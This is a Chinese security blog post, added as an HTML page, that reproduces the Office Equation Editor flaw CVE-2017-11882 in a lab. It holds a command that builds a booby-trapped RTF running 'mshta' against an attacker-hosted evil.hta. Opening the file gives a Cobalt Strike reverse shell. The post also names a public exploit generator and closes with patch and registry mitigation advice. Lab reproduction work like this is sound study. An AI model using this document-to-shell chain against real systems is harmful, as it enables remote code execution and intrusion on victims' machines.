@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>CVE-2017-11882漏洞复现 « 倾旋的博客</title>
+  <meta name="description" content="本文记录一下针对CVE-2017-11882的漏洞复现">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2017-11-21/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">CVE-2017-11882漏洞复现</h1>
+    <p class="post-meta">Nov 21, 2017</p>
+  </header>
+
+  <article class="post-content">
+    <p>本文记录一下针对CVE-2017-11882的漏洞复现
+<!--more--></p>
+
+<ul id="markdown-toc">
+  <li><a href="#0x00-%E5%89%8D%E8%A8%80" id="markdown-toc-0x00-前言">0x00 前言</a></li>
+  <li><a href="#0x01-%E7%8E%AF%E5%A2%83%E6%B8%85%E5%8D%95" id="markdown-toc-0x01-环境清单">0x01 环境清单</a></li>
+  <li>
+<a href="#0x02-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B" id="markdown-toc-0x02-复现过程">0X02 复现过程</a>    <ul>
+      <li><a href="#%E4%BD%BF%E7%94%A8cobalt-strike%E7%94%9F%E6%88%90hta%E5%8F%8D%E5%BC%B9shell" id="markdown-toc-使用cobalt-strike生成hta反弹shell">使用Cobalt Strike生成hta反弹shell</a></li>
+      <li><a href="#%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AArtfdoc%E6%96%87%E6%A1%A3" id="markdown-toc-生成一个rtfdoc文档">生成一个rtf/doc文档</a></li>
+      <li><a href="#%E7%BB%93%E6%9E%9C" id="markdown-toc-结果">结果</a></li>
+    </ul>
+  </li>
+  <li><a href="#0x03-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" id="markdown-toc-0x03-修复建议">0x03 修复建议</a></li>
+</ul>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>参考backlion师傅的PDF，记录一下这个过程。</p>
+
+<p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。
+由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。</p>
+
+<ul>
+  <li>漏洞影响版本：</li>
+  <li>Office 365</li>
+  <li>Microsoft Office 2000</li>
+  <li>Microsoft Office 2003</li>
+  <li>Microsoft Office 2007 Service Pack 3</li>
+  <li>Microsoft Office 2010 Service Pack 2</li>
+  <li>Microsoft Office 2013 Service Pack 1</li>
+  <li>Microsoft Office 2016</li>
+</ul>
+
+<h2 id="0x01-环境清单">0x01 环境清单</h2>
+
+<ul>
+  <li>WindowsServer 2008 (192.168.3.114)</li>
+  <li>Office 2007</li>
+  <li>MAC OSX(192.168.3.106)</li>
+</ul>
+
+<h2 id="0x02-复现过程">0X02 复现过程</h2>
+
+<h3 id="使用cobalt-strike生成hta反弹shell">使用Cobalt Strike生成hta反弹shell</h3>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-21/2017-11-21-0x00.png" alt="生成"></p>
+
+<p>将生成的hta文档放入WebServer根目录：http://192.168.3.106/evil.hta</p>
+
+<p>我(Cobalt Strike)本地监听了一个8081端口，用来接收客户端的Shell</p>
+
+<h3 id="生成一个rtfdoc文档">生成一个rtf/doc文档</h3>
+
+<p>github上已有生成脚本</p>
+
+<p><code class="language-plaintext highlighter-rouge">webdav_exec_CVE-2017-11882.py</code> 地址： http://payloads.online/tools/cve-2017-11882/webdav_exec_CVE-2017-11882.py</p>
+
+<p>生成rtf文档：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python webdav_exec_CVE-2017-11882.py -u http://192.168.3.106/evil.hta -e "mshta http://192.168.3.106/evil.hta" -o test.rtf
+!!! Completed !!!
+</code></pre></div></div>
+
+<p>最后将test.rtf在目标机器上执行 <code class="language-plaintext highlighter-rouge">=_=||</code>，其实可以实战的，对于APT的帮助很大</p>
+
+<h3 id="结果">结果</h3>
+
+<p>目标机器上执行后，我们可以在Cobalt Strike看到来自客户端的会话</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-21/2017-11-21-0x01.png" alt="shell"></p>
+
+<h2 id="0x03-修复建议">0x03 修复建议</h2>
+
+<p>1、微软已经对此漏洞做出了修复。</p>
+
+<ul>
+  <li>下载<code class="language-plaintext highlighter-rouge">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882</code>  更新补丁进行修补</li>
+  <li>开启Windows Update功能，定期对系统进行自动更新</li>
+</ul>
+
+<p>2、由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p>
+
+<ul>
+  <li>按下Win R组合键，打开cmd.exe</li>
+  <li>输入以下两条命令：
+<code class="language-plaintext highlighter-rouge">reg add  “HKLM\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046} ” /v “Compatibility  Flags”  /t  REG_DWORD /d    0x400</code>
+</li>
+</ul>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
